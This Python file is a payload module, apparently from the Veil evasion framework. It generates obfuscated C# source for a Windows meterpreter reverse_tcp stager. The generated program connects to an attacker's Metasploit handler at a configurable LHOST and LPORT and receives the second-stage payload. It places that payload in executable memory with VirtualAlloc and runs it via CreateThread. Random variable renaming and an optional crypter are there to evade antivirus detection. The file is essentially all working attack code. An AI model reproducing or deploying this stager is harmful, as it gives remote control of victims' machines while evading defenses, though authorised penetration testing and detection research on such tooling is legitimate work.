"""

Custom-written pure c# meterpreter/reverse_tcp stager.
Uses basic variable renaming obfuscation.

Module built by @harmj0y

"""

from modules.common import helpers
from modules.common import encryption

class Payload:

    def __init__(self):
        # required options
        self.description = "pure windows/meterpreter/reverse_tcp stager, no shellcode"
        self.language = "cs"
        self.extension = "cs"
        self.rating = "Excellent"

        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {
                                    "LHOST"            : ["", "IP of the Metasploit handler"],
                                    "LPORT"            : ["4444", "Port of the Metasploit handler"],
                                    "COMPILE_TO_EXE"   : ["Y", "Compile to an executable"],
                                    "USE_ARYA"         : ["N", "Use the Arya crypter"]
                                }



    def generate(self):

        getDataName = helpers.randomString()
        injectName = helpers.randomString()

        payloadCode = "using System; using System.Net; using System.Net.Sockets; using System.Runtime.InteropServices;\n"
        payloadCode += "namespace %s { class %s {\n" % (helpers.randomString(), helpers.randomString())

        hostName = helpers.randomString()
        portName = helpers.randomString()
        ipName = helpers.randomString()
        sockName = helpers.randomString()
        length_rawName = helpers.randomString()
        lengthName = helpers.randomString()
        sName = helpers.randomString()
        total_bytesName = helpers.randomString()
        handleName = helpers.randomString()

        payloadCode += "static byte[] %s(string %s, int %s) {\n" %(getDataName, hostName, portName)
        payloadCode += "    IPEndPoint %s = new IPEndPoint(IPAddress.Parse(%s), %s);\n" %(ipName, hostName, portName)
        payloadCode += "    Socket %s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);\n" %(sockName)
        payloadCode += "    try { %s.Connect(%s); }\n" %(sockName, ipName)
        payloadCode += "    catch { return null;}\n"
        payloadCode += "    byte[] %s = new byte[4];\n" %(length_rawName)
        payloadCode += "    %s.Receive(%s, 4, 0);\n" %(sockName, length_rawName)
        payloadCode += "    int %s = BitConverter.ToInt32(%s, 0);\n" %(lengthName, length_rawName)
        payloadCode += "    byte[] %s = new byte[%s + 5];\n" %(sName, lengthName)
        payloadCode += "    int %s = 0;\n" %(total_bytesName)
        payloadCode += "    while (%s < %s)\n" %(total_bytesName, lengthName)
        payloadCode += "    { %s += %s.Receive(%s, %s + 5, (%s - %s) < 4096 ? (%s - %s) : 4096, 0);}\n" %(total_bytesName, sockName, sName, total_bytesName, lengthName, total_bytesName, lengthName, total_bytesName)
        payloadCode += "    byte[] %s = BitConverter.GetBytes((int)%s.Handle);\n" %(handleName, sockName)
        payloadCode += "    Array.Copy(%s, 0, %s, 1, 4); %s[0] = 0xBF;\n" %(handleName, sName, sName)
        payloadCode += "    return %s;}\n" %(sName)


        sName = helpers.randomString()
        funcAddrName = helpers.randomString()
        hThreadName = helpers.randomString()
        threadIdName = helpers.randomString()
        pinfoName = helpers.randomString()

        payloadCode += "static void %s(byte[] %s) {\n" %(injectName, sName)
        payloadCode += "    if (%s != null) {\n" %(sName)
        payloadCode += "        UInt32 %s = VirtualAlloc(0, (UInt32)%s.Length, 0x1000, 0x40);\n" %(funcAddrName, sName)
        payloadCode += "        Marshal.Copy(%s, 0, (IntPtr)(%s), %s.Length);\n" %(sName,funcAddrName, sName)
        payloadCode += "        IntPtr %s = IntPtr.Zero;\n" %(hThreadName)
        payloadCode += "        UInt32 %s = 0;\n" %(threadIdName)
        payloadCode += "        IntPtr %s = IntPtr.Zero;\n" %(pinfoName)
        payloadCode += "        %s = CreateThread(0, 0, %s, %s, 0, ref %s);\n" %(hThreadName, funcAddrName, pinfoName, threadIdName)
        payloadCode += "        WaitForSingleObject(%s, 0xFFFFFFFF); }}\n" %(hThreadName)


        sName = helpers.randomString()
        payloadCode += "static void Main(){\n"
        payloadCode += "    byte[] %s = null; %s = %s(\"%s\", %s);\n" %(sName, sName, getDataName, self.required_options["LHOST"][0],self.required_options["LPORT"][0])
        payloadCode += "    %s(%s); }\n" %(injectName, sName)


        # get 12 random variables for the API imports
        r = [helpers.randomString() for x in xrange(12)]
        payloadCode += """[DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 %s,UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")]private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s,IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s); } }\n"""%(r[0],r[1],r[2],r[3],r[4],r[5],r[6],r[7],r[8],r[9],r[10],r[11])

        if self.required_options["USE_ARYA"][0].lower() == "y":
            payloadCode = encryption.arya(payloadCode)

        return payloadCode
